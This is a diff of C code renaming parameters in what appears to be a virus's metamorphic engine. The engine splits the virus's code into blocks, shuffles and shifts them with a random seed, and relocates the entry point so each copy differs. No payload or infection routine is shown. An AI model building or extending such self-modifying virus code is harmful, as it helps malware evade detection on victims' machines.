@@ -245,8 +245,8 @@ static bool	shift_blocks(struct code_block *blocks[NBLOCKS])
 
 /* --------------------------- Shift entry point ---------------------------- */
 
-static bool	shift_entry_point(void *clone_virus_address, \
-			int32_t *clone_virus_address_shift,
+static bool	shift_entry_point(void *virus_address_in_ref, \
+			int32_t *virus_address_shift,
 			struct code_block *blocks[NBLOCKS])
 {
 	for (size_t i = 0 ; i < NBLOCKS; i++)
@@ -255,9 +255,9 @@ static bool	shift_entry_point(void *clone_virus_address, \
 		void	*block_start = b->ref.ptr;
 		void	*block_end   = b->ref.ptr + b->ref.size;
 
-		if (clone_virus_address >= block_start && clone_virus_address < block_end)
+		if (virus_address_in_ref >= block_start && virus_address_in_ref < block_end)
 		{
-			*clone_virus_address_shift = b->shift_amount;
+			*virus_address_shift = b->shift_amount;
 			return true;
 		}
 	}
@@ -377,13 +377,15 @@ static bool	write_permutated_code(struct safe_ptr virus_ref, \
 ** - virus_ref: safe ptr to original code
 ** - virus_buffer_ref: safe ptr to buffer where permutated code is written
 ** - virus_buffer_size: ptr where code size is returned
+** - virus_address_in_ref: virus func address in virus_ref
+** - virus_address_shift: amount that virus func was shifted after permutations
 ** - seed: seed used for random
 */
 bool		permutate_blocks(struct safe_ptr virus_ref,   \
 			struct safe_ptr virus_buffer_ref,     \
 			size_t *virus_buffer_size,            \
-			void *clone_virus_address,            \
-			int32_t *clone_virus_address_shift,   \
+			void *virus_address_in_ref,            \
+			int32_t *virus_address_shift,   \
 			uint64_t seed)
 {
 	struct block_allocation		block_memory;
@@ -393,12 +395,12 @@ bool		permutate_blocks(struct safe_ptr virus_ref,   \
 	|| !shard_block(blocks, block_memory.blocks, &seed)
 	|| !shuffle_blocks(blocks, seed)
 	|| !shift_blocks(blocks)
-	|| !shift_entry_point(clone_virus_address, clone_virus_address_shift, blocks)
+	|| !shift_entry_point(virus_address_in_ref, virus_address_shift, blocks)
 	|| !write_permutated_code(virus_ref, virus_buffer_ref, blocks, virus_buffer_size))
 		return errors(ERR_THROW, _ERR_PERMUTATE_BLOCKS);
 #ifdef DEBUG
 	print_split_blocks(block_memory.blocks, NBLOCKS, virus_ref, virus_buffer_ref);
-	print_general(virus_ref, virus_buffer_ref, (size_t)clone_virus_address, *clone_virus_address_shift, *virus_buffer_size, seed);
+	print_general(virus_ref, virus_buffer_ref, (size_t)virus_address_in_ref, *virus_address_shift, *virus_buffer_size, seed);
 #endif
 	return true;
 }
